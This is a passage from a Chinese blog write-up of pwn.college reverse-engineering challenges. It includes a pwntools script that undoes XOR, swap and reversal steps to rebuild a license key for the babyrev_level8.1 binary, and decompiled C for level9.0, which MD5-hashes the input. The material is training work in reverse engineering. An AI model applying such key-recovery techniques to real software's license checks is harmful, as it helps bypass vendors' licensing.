<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xwwtngaurrlkodniozqnvoyennptjlevqxyqm		3 ---- 12</span><br><span class="line">xwwtngaurrlkodniozqnvoqennptjlevyxyqm</span><br><span class="line">mqyxyveljtpnneqovnqzoindoklrruagntwwx</span><br><span class="line">mqynyveljtpnxeqovnqzoindoklrruagntwwx</span><br></pre></td></tr></table></figure>

<p>调试过程中，发现两个swap的具体交换位置。然后写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level8.1&quot;</span>)</span><br><span class="line"></span><br><span class="line">hex_string=[<span class="number">0x79</span>, <span class="number">0x76</span>, <span class="number">0x8c</span>, <span class="number">0xe8</span>, <span class="number">0x55</span>, <span class="number">0x8e</span>, <span class="number">0x93</span>, <span class="number">0x75</span>, <span class="number">0x0b</span>, <span class="number">0xbc</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x9b</span>, <span class="number">0xe8</span>, <span class="number">0x5d</span>, <span class="number">0x97</span>, <span class="number">0x9d</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0xb2</span>, <span class="number">0x7b</span>, <span class="number">0x6e</span>, <span class="number">0x9b</span>, <span class="number">0xe9</span>, <span class="number">0x4b</span>, <span class="number">0x93</span>, <span class="number">0x87</span>, <span class="number">0x6b</span>, <span class="number">0x13</span>, <span class="number">0xbd</span>, <span class="number">0x75</span>, <span class="number">0x60</span>, <span class="number">0x9b</span>, <span class="number">0xf9</span>, <span class="number">0x53</span>, <span class="number">0x8f</span>, <span class="number">0x93</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(hex_string))</span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x5c</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xa3</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">2</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xbd</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">3</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x29</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x6c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xa4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x48</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">temp = hex_string[<span class="number">3</span>]</span><br><span class="line">hex_string[<span class="number">3</span>] = hex_string[<span class="number">12</span>]</span><br><span class="line">hex_string[<span class="number">12</span>] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    temp = hex_string[i]</span><br><span class="line">    hex_string[i] = hex_string[<span class="number">36</span> - i]</span><br><span class="line">    hex_string[<span class="number">36</span> - i] = temp</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">temp = hex_string[<span class="number">22</span>]</span><br><span class="line">hex_string[<span class="number">22</span>] = hex_string[<span class="number">32</span>]</span><br><span class="line">hex_string[<span class="number">32</span>] = temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h4><p>看源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x19u</span>LL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Initial input:\n&quot;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, *((<span class="type">unsigned</span> __int8 *)&amp;buf + j));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This challenge is now mangling your input using the `md5` mangler. This mangler cannot be reversed.\n&quot;</span>);</span><br><span class="line">MD5_Init();</span><br><span class="line">MD5_Update(v13, &amp;buf, <span class="number">25LL</span>);</span><br><span class="line">MD5_Final(v14, v13);</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x19u</span>LL);</span><br><span class="line">buf = v14[<span class="number">0</span>];</span><br><span class="line">v16 = v14[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This mangled your input, resulting in:\n&quot;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">24</span>; ++k )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, *((<span class="type">unsigned</span> __int8 *)&amp;buf + k));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The mangling is done! The resulting bytes will be used for the final comparison.\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Final result of mangling input:\n&quot;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">24</span>; ++m )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, *((<span class="type">unsigned</span> __int8 *)&amp;buf + m));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Expected result:\n&quot;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">24</span>; ++n )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, EXPECTED_RESULT[n]);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Checking the received license key!\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>其中需要动态调试<code>MD5_Init()</code>和<code>MD5_Update()</code>和<code>MD5_Final()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000726427302f20</span><br><span class="line">0x00005bd31c2ab000</span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lobo Q1ng</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/">https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Pwn/"># Pwn</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Lobo Q1ng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>